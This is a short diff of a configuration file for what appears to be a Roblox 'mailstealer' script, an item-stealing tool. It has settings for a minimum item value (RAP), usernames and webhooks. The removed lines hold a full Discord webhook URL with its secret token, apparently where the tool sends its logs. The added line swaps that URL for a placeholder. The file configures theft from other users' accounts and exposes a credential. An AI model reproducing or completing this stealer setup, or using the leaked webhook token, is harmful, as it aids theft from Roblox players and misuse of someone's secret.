@@ -3,8 +3,7 @@ Username2 = ""
 Webhook = ""
 MinimumRAP = 1000000
 
-LogsWebhook =
-    "https://discord.com/api/webhooks/1275844476832714846/DYpPuTfBdFrOB6AuRZToPk4c2golMlokCpf_6l0lvz0dMJnBn2HbQzAftMc3vwb_ingv"
+LogsWebhook = "webhook for logs"
 mailstealer_name = "X"
 
 Roblox_Username = Username
